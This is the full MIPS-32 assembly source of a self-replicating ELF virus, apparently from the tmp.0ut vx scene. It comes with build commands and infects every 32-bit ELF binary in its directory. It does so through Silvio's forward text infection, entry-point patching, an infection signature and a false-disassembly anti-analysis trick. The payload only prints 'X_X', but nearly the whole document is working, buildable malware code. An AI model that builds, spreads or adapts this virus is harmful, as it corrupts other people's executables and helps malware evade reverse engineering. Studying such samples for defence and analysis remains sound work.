##############################################################
##  A MIPS-32 ELF non-resident virus with false disassembly ##
##  Made with love by S01den (@s01den)                      ##
##  From the tmp.0ut crew !                                 ##
##  01/2021                                                 ##
##############################################################

# .____    .__       ________  ________         _____  ._____________  _________   __________         __                .__
# |    |   |__| ____ \_____  \ \_____  \       /     \ |   \______   \/   _____/   \______   \_____  |  | ____ __  ____ |__| ____
# |    |   |  |/    \  _(__  <  /  ____/      /  \ /  \|   ||     ___/\_____  \     |    |  _/\__  \ |  |/ /  |  \/    \|  |/    \
# |    |___|  |   |  \/       \/       \     /    Y    \   ||    |    /        \    |    |   \ / __ \|    <|  |  /   |  \  |   |  \
# |_______ \__|___|  /______  /\_______ \ /\ \____|__  /___||____|   /_______  / /\ |______  /(____  /__|_ \____/|___|  /__|___|  /
#         \/       \/       \/         \/ \/         \/                      \/  \/        \/      \/     \/          \/        \/

# In tribute to Mikhail Bakunin, an anarchist philosopher (https://en.wikipedia.org/wiki/Mikhail_Bakunin)
# Don't spread this into the wild
# I don't take any responsibility for what you do with this

# This non-destructive Proof of Concept virus infects PIE and non-PIE, written in pure MIPS assembly, infects every ELF in its directory, PIE or not.
# It also uses a little trick to avoid a correct disassembly of its main part (the well-known false-disassembly technique)

# build command: mips-as Linux.Bak0unine.asm -o bak.o ; mips-ld bak.o -o bak

# features:
# ############################################################
# ## Infection technique ## Silvio's forward text infection ##
# ############################################################
# ## Payload             ## Prints "X_X"                    ## // wow really fancy...
# ############################################################
# ## Anti-RE             ##  false-disassembly              ##
# ############################################################

# ---------------------------- CUT-HERE ----------------------------

.text
  .global _start

_start:
# - start of the prolog - #

# first of all, we have to mmap an executable area in memory where we can copy the aligned code
# (because the fake disassembly technique fucks up the alignment, and in MIPS, we can't jump anywhere...)
  sw	$zero,20($sp)
  li	$v0,0
  sw	$v0,16($sp)

  li $a0, 0
  li $a1, 0x6a8
  li $a2, 7    # PROT_READ|PROT_WRITE|PROT_EXEC
  li $a3, 0x0802 # MAP_ANONYMOUS | MAP_PRIVATE
  li $v0, 4210 # sys_mmap2
  syscall

  bgezal $zero, get_pc
  add $t1, $t1, 0x6f # 0x = the number of bytes to reach true_start
  move $t2, $v0
  li $t0, 0

  .get_vx: # copy the virus body in the memory region we've just mmaped
    lb $t3, 0($t1)
    sb $t3, 0($t2)
    addi $t0, $t0, 1
    addi $t1, $t1, 1
    addi $t2, $t2, 1
    blt $t0, 0x615, .get_vx

    jal $v0 # jump to the mmaped region
    beq $zero, $zero, eof

  get_pc:
    move $t1, $ra
    jr $ra

  eof:
    li $a0, 2
    li $v0, 4001 # sys_exit
    syscall
    .ascii "\xac\xab\xac\xab" # because the code to ret to the OEP is larger than eof, we have to make padding
    .ascii "\xac\xab\xac\xab"
    .ascii "\xac\xab\xac\xab"
    .ascii "\xac\xab\xac\xab"
    .ascii "\xac\xab\xac\xab"
    .ascii "\xac\xab\xac\xab"

  .ascii "\xeb\x01\xe8" # false-disas bytes; different for every new infection
  # - end of the prolog - #
  # - The beginning of the virus body - #
  true_start:
  addi $gp, $ra, 64
  move $v1, $sp
  sub  $sp, $sp, 0x1000
  move $a0, $sp
  li $a1, 0xff
  li $v0, 4203 # sys_getcwd
  syscall

  move $a0, $sp
  li $a1, 0
  li $a2, 0
  li $v0, 4005 # sys_open
  syscall

  blt $v0, 0, payload # exit if return code of sys_open is < 0

  move $a0, $v0
  move $a1, $sp
  li $a2, 1024
  li $v0, 4219 # sys_getdents64
  syscall
  move $s1, $v0 # store the result (the number of entries) in $s1

  li $v0, 4006 # sys_close
  syscall

  li $s0, 0 # s0 will be our counter
  parse_dir:
    move $s2, $sp # s2 will contain the address of the filename
    addi $s2, $s2, 0x13 # d_name

    li $t1, 0
    addi $t1, $sp, 0x12
    lb $t1, 0($t1) # t1 now contains the type of the entry (file or dir)

    bgezal $zero, infect  # little trick: we have to use relative jumps but
    # j and jal instructions are absolute so that's why we use a beq which is always
    # true as a relative jump instruction (branches instructions are relatives)

    li $t9, 0
    addi $t9, $sp, 0x10 # get d_reclen (see the organization of the dirent64 structure...)
    lb $t0, 1($t9) # the buffer position += d_reclen

    add $s0, $s0, $t0
    add $sp, $sp, $t0

    blt $s0, $s1, parse_dir # if counter < nbr of entries : jmp to parse_dir
    beq $zero, $zero, payload  # little trick: we have to use relative jumps but
    # j and jal instructions are absolute so that's why we use a beq which is always
    # true as a relative jump instruction (branches instructions are relatives)

infect:
  ############## REGISTER TABLE ##############
  ## $s0 = counter of entries               ##
  ## $s1 = the number of entries            ##
  ## $s2 = the addr of the filename we treat##
  ## $s3 = the addr of the stack before jal ##
  ## $s4 = the fd of the potential host     ##
  ## $s5 = the addr returned by mmap        ##
  ## $s6 = OEP                              ##
  ## $s7 = virtual addr of the vx = new EP  ##
  ## $t9 = length of the file               ##
  ############################################

  move $s3, $sp
  sub $sp, $sp, 0x100
  bne $t1, 0x8, end # if the name we've got isn't a filename, return to parse_dir

  li $v0, 4005
  move $a0, $s2
  li $a1, 0x402 # RW mode
  li $a2, 0
  syscall # sys_open

  bgt $v0, 0x10, end # if the openning failed : jmp to parse_dir
  move $s4, $v0

  move $a0, $s4
  move $a1, $sp
  li $v0, 4108 # sys_fstat (to know the length of the file we're trying to infect)
  syscall

  lw $t9, 48($sp)

  # I didn't know how to pass more than 4 arguments (the registers $a0...$a3), so I made a simple program which use mmap(), I statically linked it
  # and disassembled it to see how mmap was called, that's where I've got the 3 following lines
	sw	$zero,20($sp)
  li	$v0,3
  sw	$v0,16($sp)

  li $a0, 0
  move $a1, $t9
  li $a2, 6
  li $a3, 1
  li $v0, 4210 # sys_mmap2 (to map the content of the file in memory)
  syscall

  move $s5, $v0

  .check_magic:
    lw $t0, 0($s5)
    li $t1, 0x7f454c46 # check if the file is an ELF (by checking the magic bytes)
    bne $t0, $t1, end

  .check_bits:
    lb $t0, 4($s5)
    bne $t0, 1, end # here, we check e_ident[EI_CLASS], to know if the ELF we're trying to infect is 32 or 64 bit (if it's 64 bit, goto end)

  .check_signature:
    lw $t0, 9($s5)  # the signature is located in e_hdr.padding, such as in Lin64.Kropotkine
    beq $t0, 0xdeadc0de, end

  .infection:
    # We use the silvio's forward text infection technique -> http://ivanlef0u.fr/repo/madchat/vxdevl/vdat/tuunix02.htm
    # To insert code at the end of the text segment thus leaves us with the following to do so far.
    #  	* Increase p_shoff to account for the new code in the ELF header
    #  	* Locate the text segment program header
    #  		* Increase p_filesz to account for the new code
    #  		* Increase p_memsz to account for the new code
    #  	* For each phdr who's segment is after the insertion (text segment)
    #  		* increase p_offset to reflect the new position after insertion
    #  	* For each shdr who's section resides after the insertion
    #  		* Increase sh_offset to account for the new code
    #  	* Physically insert the new code into the file - text segment p_offset
    #  	  + p_filesz (original)

    lh $t0, 0x2c($s5) # load e_phnum in $t0
    li $t1, 0         # the counter of program headers
    lw $t5, 0x1c($s5) # load e_phoff in $t2

    .search_phdr: # in this sub-routine, we're looking for the segment which contains .text
      lh $t3, 0x2a($s5) # load e_phentsize in $t3
      mult $t3, $t1
      mflo $t3
      add $t3, $t3, $t5
      add $t2, $s5, $t3

      lw $t3, 0($t2) # load p_type in $t3
      bne $t3, 1, .end_loop_search_t # 1 = PT_LOAD so here we check if the segment is loadable

      lw $t3, 0x18($t2) # load p_flags in $t3
      bne $t3, 5, .end_loop_search_t # 5 = PT_X | PT_R so here we check if the segment is readable and executable

      # if we're here, we've found the right phdr
      lw $t3, 0x4($t2)  # load p_offset in $t3
      lw $t4, 0x10($t2) # load p_filesz in $t4
      add $s6, $t3, $t4 # end_of_.text = offset_.text + length_.text
      lw $t3, 0x8($t2)  # load p_vaddr in $t3
      add $s7, $t3, $t4 # virtual addr of the start of the vx body = virtual addr of the end of .text so vaddr_vx = vaddr_.text + length_.text
      lw $t3, 0x18($s5) # save the original entry point in $t8
      sw $s7, 0x18($s5) # patch the entry point with vaddr_vx
      move $s7, $t3

      # -- add to p_filesz the size of the vx --
      lw $t3, 0x10($t2)
      addi $t3, $t3, 0x6a8
      sw $t3, 0x10($t2)

      # -- add to p_memsz the size of the vx --
      lw $t3, 0x14($t2)
      addi $t3, $t3, 0x6a8
      sw $t3, 0x14($t2)

      # -- insert the signature of the vx --
      li $t3, 0xdeadc0de
      sw $t3, 0x9($s5)

      addi $t1, $t1, 1
      # in this routine we'll patch the lasts phdr to take into account the size of the vx
      .increase_sizeof_phdr:
        lh $t3, 0x2a($s5) # load e_phentsize in $t3
        mult $t3, $t1
        mflo $t3
        add $t3, $t3, $t5
        add $t2, $s5, $t3

        # increase p_offset
        lw $t3, 4($t2)
        addi $t3, $t3, 4096 # add PAGE_SZ32 to p_offset
        sw $t3, 4($t2)

        addi $t1, $t1, 1
        blt $t1, $t0, .increase_sizeof_phdr

      beq $zero, $zero, .search_shdr

      .end_loop_search_t:
        addi $t1, $t1, 1
        blt $t1, $t0, .search_phdr

    .search_shdr:
      lh $t0, 0x30($s5) # load e_shnum in $t0
      li $t1, 0         # the counter of section headers
      lw $t5, 0x20($s5) # load e_shoff in $t2

      .loop_shdr:
        lh $t3, 0x2e($s5) # load e_shentsize in $t3
        mult $t3, $t1
        mflo $t3
        add $t3, $t3, $t5
        add $t2, $s5, $t3

        lw $t3, 0x10($t2) # sh_offset
        bgt $t3, $s6, .section_after_txt_end # here we check if the section is located after the one we're infecting

        lw $t3, 0x14($t2) # sh_size
        lw $t4, 0x0C($t2) # sh_addr
        add $t4, $t4, $t3
        beq $t4, $s6, .section_of_vx # here we check if the section is the one we're infecting

        .end_loop_shdr:
          addi $t1, $t1, 1
          blt $t1, $t0, .loop_shdr
        beq $zero, $zero, .end_infection

        .section_after_txt_end:
          addi $t3, $t3, 4096 # add PAGE_SZ32 to sh_offset
          sw $t3, 0x10($t2)
          beq $zero, $zero, .end_loop_shdr

        .section_of_vx:
          addi $t3, $t3, 0x6a8 # <- add the vx size to sh_size
          sw $t3, 0x14($t2)
          beq $zero, $zero, .end_loop_shdr

    .end_infection:
    # -- add to e_shoff the size of a 32 bit page (because the section header table is located at the end of the file) --
    lw $t0, 0x20($s5)
    addi $t0, $t0, 4096
    sw $t0, 0x20($s5)

    move $a0, $s5
    move $a1, $t9
    li $a2, 0
    li $v0, 4144
    syscall # sys_msync, to apply the change to the file

    sub $sp, $sp, 0x6a8 # <- make room in the stack for the vx bytes
    move $t7, $ra

    li $t0, 0
    move $t2, $sp

    # copy the prolog of the virus (and change randomly the bytes for the fake disassembly)
    # ---- the code to hardcode ----
    # afa00014       sw zero, 0x14(sp)
    # 24020000       addiu v0, zero, 0
    # afa20010       sw v0, 0x10(sp)
    # 24040000       addiu a0, zero, 0
    # 240506a8       addiu a1, zero, 0x6a8
    # 24060007       addiu a2, zero, 7
    # 24070802       addiu a3, zero, 0x802
    # 24021072       addiu v0, zero, 0x1072
    # 0000000c       syscall
    # 04110011       bal loc.get_pc
    # 00000000       nop
    # 2129006f       addi t1, t1, 0x6f
    # 00405025       move t2, v0
    # 24080000       addiu t0, zero, 0
    # -- .get_vx:
    # 812b0000       lb t3, (t1)
    # 00000000       nop
    # a14b0000       sb t3, (t2)
    # 21080001       addi t0, t0, 1
    # 21290001       addi t1, t1, 1
    # 214a0001       addi t2, t2, 1
    # 29010615       slti at, t0, 0x615
    # 1420fff8       bnez at, loc..get_vx
    # 00000000       nop
    # 0040f809       jalr v0
    # 00000000       nop
    # 10000003       b loc.eof
    # 00000000       nop
    # -- get_pc:
    # 03e00008       jr ra
    # 03e04825       move t1, ra
    # ------------------------------

    li $t3, 0xafa00014
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x24020000
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0xafa00010
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x24040000
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x240506a8
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x24060007
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x24070802
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x24021072
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x0000000c
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x0411000f
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x00000000
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x2129006f
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x00405025
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x24080000
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x812b0000
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x00000000
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0xa14b0000
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x21080001
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x21290001
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x214a0001
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x29010615
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x1420fff8
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x00000000
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x00400008
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x00000000
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x03e00008
    sw $t3, 0($t2)
    addi $t2, $t2, 4
    li $t3, 0x03e04825
    sw $t3, 0($t2)
    addi $t2, $t2, 4

    # ---- the code to hardcode ----
    # 0411fff5       bal get_pc
    # 00000000       nop
    # 2129fc70       addi t1, t1, -0x390
    # 3401dead       ori at, zero, 0xdead
    # 01214822       sub t1, t1, at
    # 2129beef       addi t1, t1, -0x4111
    # 0060e825       move sp, v1
    # 01200008       jr t1
    # ------------------------------

    # here we're writting the code to ret2OEP despite the PIE

    li $t3, 0x0411fffd
    sw $t3, 0($t2)
    addi $t2, $t2, 4

    li $t3, 0x00000000
    sw $t3, 0($t2)
    addi $t2, $t2, 4

    li $t3, 0x2129ff8c
    sw $t3, 0($t2)
    addi $t2, $t2, 4

    li $t3, 0x3401
    sh $t3, 0($t2)
    addi $t2, $t2, 2

    move $t3, $s6
    sh $t3, 0($t2)
    addi $t2, $t2, 2

    li $t3, 0x01214822
    sw $t3, 0($t2)
    addi $t2, $t2, 4

    li $t3, 0x2129
    sh $t3, 0($t2)
    addi $t2, $t2, 2

    move $t3, $s7
    sh $t3, 0($t2)
    addi $t2, $t2, 2

    li $t3, 0x0060e825
    sw $t3, 0($t2)
    addi $t2, $t2, 4

    li $t3, 0x01200008
    sw $t3, 0($t2)
    addi $t2, $t2, 4

    li $t3, 0x00000000
    sw $t3, 0($t2)
    addi $t2, $t2, 4

    nop

    xor $v0, $t2, 0xdead # thanks to the aslr, t2 is random \o/ so we use it as a seed to randomize the bytes which make the false disassembly
    move $t3, $v0        # (this technique of "polymorphic" false-disassembly is useless in mips (because in mips
    sw $t3, 0($t2)       # every instruction is made of the same number of bytes (which is 4)), but can be interesting in other architectures)
    addi $t2, $t2, 3     # (I'm writting a paper on this... ;))

    bgezal $zero, get_pc_2
    sub $t1, $t1, 0x530 # 0x530 = the number of bytes before this routine in the virus body

    .get_vx_2:
      lb $t3, 0($t1)
      sb $t3, 0($t2)
      addi $t0, $t0, 1
      addi $t1, $t1, 1
      addi $t2, $t2, 1
      blt $t0, 0x615, .get_vx_2 # 0x611 = the size of the virus body

    move $ra, $t7

    move $a0, $s4
    lw $a1, 0x20($s5)
    li $a2, 0    # SEEK_SET
    li $v0, 4019 # sys_lseek
    syscall # here, we seek after the future vx code

    move $a0, $s4
    lw $t0, 0x20($s5)
    sub $t0, $t0, 4096
    add $a1, $s5, $t0
    move $a2, $t9
    sub $a2, $a2, $t0 # len of host - text_end = length of the end of the file
    li $v0, 4004  # sys_write
    syscall

    move $a0, $s4
    move $a1, $s6
    li $a2, 0    # SEEK_SET
    li $v0, 4019 # sys_lseek
    syscall

    move $a0, $s4
    move $a1, $sp
    li $a2, 4096 # len =  PAGE_SZ32
    li $v0, 4004 # sys_write
    syscall

    move $a0, $s5
    move $a1, $t9
    li $a2, 0
    li $v0, 4091
    syscall # sys_munmap

end:
  move $a0, $s4
  li $v0, 4006 # sys_close
  syscall
  move $sp, $s3
  jr $ra

get_pc_2:
  move $t1, $ra
  jr $ra


payload:
    li $a0, 0
    li $t0, 0x585f580a # X_X
    sw $t0, 0($sp)
    move $a1, $sp
    li $a2, 4
    li $v0, 4004 # sys_write
    syscall
    jr $gp
  # - end of the virus body - #

# ---------------------------- CUT-HERE ----------------------------

# ___________                              __
# \__    ___/____ ______      ____  __ ___/  |_
#   |    | /     \\____ \    /  _ \|  |  \   __\
#   |    ||  Y Y  \  |_> >  (  <_> )  |  /|  |
#   |____||__|_|  /   __/ /\ \____/|____/ |__|
#               \/|__|    \/
#
# --> Stay tuned...

# Greetz to: Sblip, Okb, TMZ
# Long live to the vx scene !
# Siamo tutti antifascisti
